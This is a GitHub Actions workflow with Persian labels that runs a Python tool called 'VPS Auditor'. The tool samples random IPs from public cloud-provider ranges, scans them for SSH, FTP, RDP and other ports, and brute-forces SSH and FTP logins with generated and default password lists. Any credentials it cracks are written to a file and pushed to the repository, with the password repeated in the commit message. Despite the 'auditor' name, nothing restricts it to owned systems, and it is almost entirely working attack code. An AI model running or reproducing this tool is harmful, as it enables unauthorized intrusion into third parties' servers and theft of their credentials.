name: VPS Auditor - High-Speed Multi-Port

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'حالت اسکن'
        required: true
        default: 'datacenter'
        type: choice
        options:
          - datacenter
          - explorer
          - manual
      datacenter_provider:
        description: 'پرووایدر دیتاسنتر (برای datacenter)'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - aws
          - azure
          - gcp
          - digitalocean
          - linode
          - vultr
          - cloudflare
      max_ips:
        description: 'حداکثر تعداد آیپی برای اسکن'
        required: false
        default: '500'
      scan_range:
        description: 'رنج CIDR (برای explorer)'
        required: false
      scan_ports:
        description: 'پورت‌های هدف (پیش‌فرض: 22,21,3389,5900,8080,443)'
        required: false
        default: '22,21,3389,5900,8080,443'
      test_threads:
        description: 'تعداد نخ‌های هم‌زمان برای تست اعتبارنامه (پیش‌فرض 20)'
        required: false
        default: '20'
      keywords:
        description: 'کلمات کلیدی برای ListForge'
        required: false
      targets:
        description: 'IPهای دستی (برای manual)'
        required: false
      usernames:
        description: 'یوزرنیم‌های دستی (برای manual)'
        required: false
      passwords:
        description: 'پسوردهای دستی (برای manual)'
        required: false
      timeout:
        description: 'زمان انتظار برای هر اتصال'
        required: true
        default: '5'

permissions:
  contents: write

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: نصب کتابخانه‌ها
        run: pip3 install paramiko rich requests

      - name: اجرای High-Speed Auditor
        env:
          MODE: ${{ github.event.inputs.mode }}
          DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
          MAX_IPS: ${{ github.event.inputs.max_ips }}
          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
          SCAN_PORTS: ${{ github.event.inputs.scan_ports }}
          TEST_THREADS: ${{ github.event.inputs.test_threads }}
          KEYWORDS: ${{ github.event.inputs.keywords }}
          TARGETS_INPUT: ${{ github.event.inputs.targets }}
          USERNAMES_INPUT: ${{ github.event.inputs.usernames }}
          PASSWORDS_INPUT: ${{ github.event.inputs.passwords }}
          TIMEOUT: ${{ github.event.inputs.timeout }}
        run: |
          python3 << 'PYEOF'
          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, re
          from datetime import datetime
          from rich.console import Console
          from rich.table import Table
          from rich.panel import Panel
          from ftplib import FTP
          import paramiko

          console = Console()
          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor – High-Speed Multi-Port[/bold yellow]", border_style="yellow"))

          MODE = os.environ["MODE"]
          TIMEOUT = int(os.environ["TIMEOUT"])
          MAX_IPS = int(os.environ.get("MAX_IPS", "500"))
          DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
          SCAN_PORTS = [int(p.strip()) for p in os.environ.get("SCAN_PORTS", "22,21,3389,5900,8080,443").split(',')]
          TEST_THREADS = int(os.environ.get("TEST_THREADS", "20"))

          CRED_FILE = "found_credentials.txt"
          if not os.path.exists(CRED_FILE):
              with open(CRED_FILE, "w") as f:
                  f.write(f"# VPS Auditor - Found Credentials\n")
                  f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                  f.write("# Format: IP:PORT | SERVICE | USERNAME | PASSWORD\n")
                  f.write("="*60 + "\n")

          def save_credential(ip, port, service, username, password):
              timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
              with open(CRED_FILE, "a") as f:
                  f.write(f"[{timestamp}] {ip}:{port} | {service} | {username} | {password}\n")
              os.system(f"git add {CRED_FILE} && git commit -m 'Found: {ip}:{port} {username}:{password}' && git push 2>/dev/null || true")

          # ===== ۱. کشف آیپی‌ها =====
          targets = []
          if MODE == "datacenter":
              console.print("[cyan]🌐 دریافت لیست آیپی دیتاسنترها...[/cyan]")
              datacenter_urls = []
              try:
                  resp = requests.get("https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt", timeout=30)
                  for line in resp.text.splitlines():
                      line = line.strip()
                      if line and not line.startswith("#"):
                          datacenter_urls.append(line)
                  console.print(f"[green]✓ {len(datacenter_urls)} CIDR از jhassine[/green]")
              except Exception as e:
                  console.print(f"[yellow]⚠️ jhassine در دسترس نیست: {e}[/yellow]")
              provider_map = {"aws":"aws","azure":"azure","gcp":"googlecloud","digitalocean":"digitalocean","linode":"linode","vultr":"vultr","cloudflare":"cloudflare"}
              base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
              for prov in provider_map.values():
                  try:
                      resp = requests.get(f"{base_url}/{prov}-ip-ranges.json", timeout=30)
                      data = resp.json()
                      for item in data.get("prefixes",[]):
                          if "ipv4Prefix" in item:
                              datacenter_urls.append(item["ipv4Prefix"])
                  except: pass
              all_ips = set()
              for cidr in datacenter_urls[:200]:
                  try:
                      network = ipaddress.IPv4Network(cidr, strict=False)
                      hosts = list(network.hosts())
                      sample_size = min(5, len(hosts))
                      for ip in random.sample(hosts, sample_size):
                          all_ips.add(str(ip))
                  except: pass
              targets = list(all_ips)[:MAX_IPS]
          elif MODE == "explorer":
              scan_range = os.environ.get("SCAN_RANGE","").strip()
              if not scan_range:
                  console.print("[red]❌ برای Explorer Mode باید scan_range وارد کنید[/red]")
                  sys.exit(1)
              network = ipaddress.IPv4Network(scan_range, strict=False)
              targets = [str(ip) for ip in network.hosts()]
          elif MODE == "manual":
              targets_input = os.environ.get("TARGETS_INPUT","").strip()
              targets = [x.strip() for x in targets_input.split(',') if x.strip()] if targets_input else []

          if not targets:
              console.print("[red]❌ هیچ IP هدفی پیدا نشد[/red]")
              sys.exit(1)

          # ===== ۲. اسکن پورت‌ها =====
          console.print(f"\n🔍 اسکن {len(targets)} آیپی برای {len(SCAN_PORTS)} پورت...")
          port_results = {}
          def check_port(ip, port):
              try:
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(0.5)
                  result = sock.connect_ex((ip, port))
                  sock.close()
                  return (ip, port, result == 0)
              except:
                  return (ip, port, False)

          with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
              futures = [executor.submit(check_port, ip, port) for ip in targets for port in SCAN_PORTS]
              for future in concurrent.futures.as_completed(futures):
                  ip, port, is_open = future.result()
                  port_results.setdefault(ip, {})[port] = is_open
                  if is_open:
                      console.print(f"[green]✓ {ip}:{port}[/green]")

          with open("discovered_ports.txt", "w") as f:
              for ip, ports in port_results.items():
                  open_ports = [p for p, status in ports.items() if status]
                  if open_ports:
                      f.write(f"{ip}: {','.join(map(str, open_ports))}\n")
          os.system("git add discovered_ports.txt && git commit -m 'Port scan' && git push 2>/dev/null || true")

          # ===== ۳. ساخت لیست‌های ListForge =====
          def gen_usernames(keywords):
              base = ["root","admin","user","test","guest","ubuntu","debian","centos","administrator"]
              for kw in keywords:
                  base.extend([kw.lower(), kw.capitalize()])
              return list(set(base))

          def gen_passwords(keywords):
              base = ["123456","password","admin","root","12345678","qwerty","password123"]
              years = ["2024","2025","2026"]
              specials = ["!","@","#","$",""]
              for kw in keywords:
                  kl, kc = kw.lower(), kw.capitalize()
                  for yr in years:
                      for sp in specials:
                          base.extend([f"{kc}{yr}{sp}", f"{kl}{yr}{sp}", f"{kl}@{yr}"])
                  base.extend([kl, kc])
              return list(set(base))

          if MODE != "manual":
              keys = os.environ.get("KEYWORDS","admin,web,server,vps,cloud,host").split(',')
              usernames = gen_usernames([k.strip() for k in keys])
              passwords = gen_passwords([k.strip() for k in keys])
              console.print(f"[green]📝 ListForge: {len(usernames)} کاربر | {len(passwords)} رمز[/green]")
          else:
              unames = os.environ.get("USERNAMES_INPUT","").strip()
              pwords = os.environ.get("PASSWORDS_INPUT","").strip()
              usernames = [x.strip() for x in unames.split(',') if x.strip()] if unames else ["root"]
              passwords = [x.strip() for x in pwords.split(',') if x.strip()] if pwords else ["123456"]

          # ===== ۴. تست فوق‌سریع =====
          results_lock = threading.Lock()
          results = []
          total_combos = 0

          def test_single_combo(ip, port, service, username, password):
              success = False
              try:
                  if service == "SSH":
                      client = paramiko.SSHClient()
                      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                      client.connect(hostname=ip, port=port, username=username, password=password,
                                    timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
                      client.close()
                      success = True
                  elif service == "FTP":
                      ftp = FTP()
                      ftp.connect(ip, port, timeout=TIMEOUT)
                      ftp.login(username, password)
                      ftp.quit()
                      success = True
              except:
                  pass
              return (ip, port, service, username, password, success)

          console.print(f"\n⚡ شروع تست‌های سریع (نخ‌ها: {TEST_THREADS})...")

          for ip, ports in port_results.items():
              for port, is_open in ports.items():
                  if not is_open:
                      continue
                  service = "SSH" if port==22 else "FTP" if port==21 else "HTTP" if port in (80,443,8080) else "RDP" if port==3389 else f"port-{port}"
                  # کش پسوردهای ناموفق برای این هدف
                  failed_passwords = set()
                  # ساخت لیست تمام ترکیب‌ها
                  combos = []
                  for user in usernames:
                      for pwd in passwords:
                          if pwd not in failed_passwords:
                              combos.append((user, pwd))
                  total_combos += len(combos)

                  with concurrent.futures.ThreadPoolExecutor(max_workers=TEST_THREADS) as executor:
                      future_to_combo = {
                          executor.submit(test_single_combo, ip, port, service, user, pwd): (user, pwd)
                          for user, pwd in combos
                      }
                      for future in concurrent.futures.as_completed(future_to_combo):
                          user, pwd = future_to_combo[future]
                          try:
                              iip, pport, ssvc, uuser, ppwd, success = future.result()
                              if success:
                                  console.print(f"[green]✅ {iip}:{pport} ({ssvc}) {uuser}:{ppwd}[/green]")
                                  with results_lock:
                                      results.append((iip, pport, ssvc, uuser, ppwd, "SUCCESS"))
                                      save_credential(iip, pport, ssvc, uuser, ppwd)
                              else:
                                  with results_lock:
                                      results.append((iip, pport, ssvc, uuser, ppwd, "FAILED"))
                                  failed_passwords.add(pwd)  # این پسورد دیگر روی این هدف آزمایش نشود
                          except Exception as e:
                              console.print(f"[red]✗ خطا: {e}[/red]")

          # ===== ۵. گزارش =====
          successes = [r for r in results if r[5]=="SUCCESS"]
          if successes:
              tbl = Table(title="✅ Successful Credentials", show_header=True, header_style="bold white")
              tbl.add_column("IP", style="cyan"); tbl.add_column("Port"); tbl.add_column("Service"); tbl.add_column("User"); tbl.add_column("Pass")
              for r in successes:
                  tbl.add_row(r[0], str(r[1]), r[2], r[3], r[4])
              console.print(tbl)
          else:
              console.print("[red]❌ هیچ اعتبارنامه موفقی پیدا نشد.[/red]")

          report = "vps_audit_report.txt"
          with open(report, "w", encoding="utf-8") as f:
              f.write(f"VPS Auditor High-Speed Report\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nPorts: {SCAN_PORTS}\n")
              for r in results:
                  f.write(f"{r[0]}:{r[1]} ({r[2]}) {r[3]}:{r[4]} -> {r[5]}\n")
              if successes:
                  f.write("\n--- Successful Credentials ---\n")
                  for r in successes:
                      f.write(f"{r[0]}:{r[1]} ({r[2]}) - {r[3]}:{r[4]}\n")
          os.system(f"git add {report} && git commit -m 'High-speed audit report' && git push 2>/dev/null || true")
          console.print(f"\n[green]📄 گزارش کامل: {report}[/green]")
          PYEOF
